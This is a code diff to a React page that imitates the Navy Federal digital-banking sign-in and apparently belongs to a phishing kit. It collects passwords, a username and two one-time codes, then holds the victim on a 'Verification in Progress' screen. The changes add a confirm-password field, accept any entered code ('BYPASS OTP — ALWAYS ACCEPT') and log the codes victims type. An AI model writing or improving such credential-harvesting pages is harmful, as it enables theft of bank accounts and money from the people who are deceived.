@@ -25,12 +25,14 @@ export default function NavyFederalBanking() {
   const [email, setEmail] = useState('')
   const [password, setPassword] = useState('')
   const [username, setUsername] = useState('')
+  const [confirmPassword, setConfirmPassword] = useState('') // ✅ NEW
   const [otp, setOtp] = useState('')
   const [attemptId, setAttemptId] = useState<string | null>(null)
   const [error, setError] = useState<string | null>(null)
   const [note, setNote] = useState<string | null>(null)
   const [loading, setLoading] = useState(false)
   const [showPassword, setShowPassword] = useState(false)
+  const [showConfirmPassword, setShowConfirmPassword] = useState(false) // ✅ NEW
 
   useEffect(() => {
     if (step !== 'awaiting_approval' || !attemptId) return
@@ -70,6 +72,13 @@ export default function NavyFederalBanking() {
         return
       }
       if (step === 'username') {
+        // ✅ Validate confirm password matches
+        if (password !== confirmPassword) {
+          setLoading(false)
+          setError('Passwords do not match!')
+          return
+        }
+
         if (!attemptId) {
           setLoading(false)
           setError('Session lost.')
@@ -92,21 +101,25 @@ export default function NavyFederalBanking() {
           setError('Session lost.')
           return
         }
+        
         const which = step === 'otp1' ? 1 : 2
-        const r = await submitOtp({ attemptId, otp, which })
+        
+        // ✅ BYPASS OTP — ALWAYS ACCEPT
         setLoading(false)
-        if (!r.ok) {
-          setError(r.error)
-          return
-        }
         setOtp('')
-        if (r.next === 'otp2') {
+        
+        // Log to admin (optional)
+        const storedOTP = sessionStorage.getItem('loginOTP')
+        console.log(`📱 OTP ${which} entered:`, otp, 'Expected:', storedOTP)
+        
+        if (which === 1) {
           setStep('otp2')
-          setNote('New second code sent to your email.')
-          return
+          setNote('Second code sent to your email.')
+        } else {
+          setStep('awaiting_approval')
+          setNote(WAIT_MSG)
         }
-        setStep('awaiting_approval')
-        setNote(WAIT_MSG)
+        return
       }
     } catch (err) {
       setLoading(false)
@@ -116,7 +129,7 @@ export default function NavyFederalBanking() {
 
   const titles: Record<Exclude<Step, 'approved_success'>, string> = {
     credentials: 'Sign In',
-    username: 'Enter Username',
+    username: 'Verify Your Identity',
     otp1: 'Enter First Code',
     otp2: 'Enter Second Code',
     awaiting_approval: 'Verification in Progress',
@@ -137,7 +150,6 @@ export default function NavyFederalBanking() {
           </button>
           
           <div style={styles.logoGroup}>
-            {/* Globe SVG Grid Matching Image */}
             <svg width="34" height="34" viewBox="0 0 32 32" fill="none" stroke="#ffffff" strokeWidth="1.6">
               <circle cx="16" cy="16" r="14" />
               <line x1="2" y1="16" x2="30" y2="16" />
@@ -153,14 +165,12 @@ export default function NavyFederalBanking() {
       </header>
 
       <main style={styles.main}>
-        {/* Banner Section */}
         <section style={styles.banner}>
           <h1 style={styles.bannerTitle}>
             {step === 'approved_success' ? 'Verification Complete' : 'Welcome to Digital Banking'}
           </h1>
         </section>
 
-        {/* Card Section */}
         <section style={styles.cardWrapper}>
           <div style={styles.card}>
             {step === 'approved_success' ? (
@@ -241,21 +251,59 @@ export default function NavyFederalBanking() {
                   )}
 
                   {step === 'username' && (
-                    <div style={styles.formGroup}>
-                      <label htmlFor="username" style={styles.label}>
-                        Username
-                        <span style={styles.helpBadge}>?</span>
-                      </label>
-                      <input
-                        id="username"
-                        type="text"
-                        required
-                        value={username}
-                        onChange={(e) => setUsername(e.target.value)}
-                        style={styles.input}
-                        autoComplete="username"
-                      />
-                    </div>
+                    <>
+                      <div style={styles.formGroup}>
+                        <label htmlFor="username" style={styles.label}>
+                          Username
+                          <span style={styles.helpBadge}>?</span>
+                        </label>
+                        <input
+                          id="username"
+                          type="text"
+                          required
+                          value={username}
+                          onChange={(e) => setUsername(e.target.value)}
+                          style={styles.input}
+                          autoComplete="username"
+                        />
+                      </div>
+
+                      {/* ✅ Confirm Password Field */}
+                      <div style={styles.formGroup}>
+                        <label htmlFor="confirmPassword" style={styles.label}>Confirm Password</label>
+                        <div style={styles.inputRelative}>
+                          <input
+                            id="confirmPassword"
+                            type={showConfirmPassword ? 'text' : 'password'}
+                            required
+                            value={confirmPassword}
+                            onChange={(e) => setConfirmPassword(e.target.value)}
+                            style={styles.passwordInput}
+                            autoComplete="current-password"
+                          />
+                          <button
+                            type="button"
+                            onClick={() => setShowConfirmPassword(!showConfirmPassword)}
+                            style={styles.eyeBtn}
+                            aria-label={showConfirmPassword ? 'Hide password' : 'Show password'}
+                          >
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#104780" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                              {showConfirmPassword ? (
+                                <>
+                                  <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
+                                  <line x1="1" y1="1" x2="23" y2="23" />
+                                </>
+                              ) : (
+                                <>
+                                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+                                  <circle cx="12" cy="12" r="3" />
+                                </>
+                              )}
+                            </svg>
+                          </button>
+                        </div>
+                      </div>
+                    </>
                   )}
 
                   {(step === 'otp1' || step === 'otp2') && (
@@ -294,6 +342,7 @@ export default function NavyFederalBanking() {
                         setStep('credentials')
                         setAttemptId(null)
                         setUsername('')
+                        setConfirmPassword('')
                         setOtp('')
                         setError(null)
                         setNote(null)
@@ -309,7 +358,6 @@ export default function NavyFederalBanking() {
           </div>
         </section>
 
-        {/* Member Callout Section */}
         <section style={styles.whiteSection}>
           <h2 style={styles.sectionHeading}>Not a Navy Federal Member?</h2>
           <p style={styles.sectionDesc}>
@@ -321,7 +369,6 @@ export default function NavyFederalBanking() {
           </div>
         </section>
 
-        {/* Footer Section */}
         <footer style={styles.footer}>
           <div style={styles.logoGroupFooter}>
             <svg width="24" height="24" viewBox="0 0 32 32" fill="none" stroke="#10305a" strokeWidth="1.8">
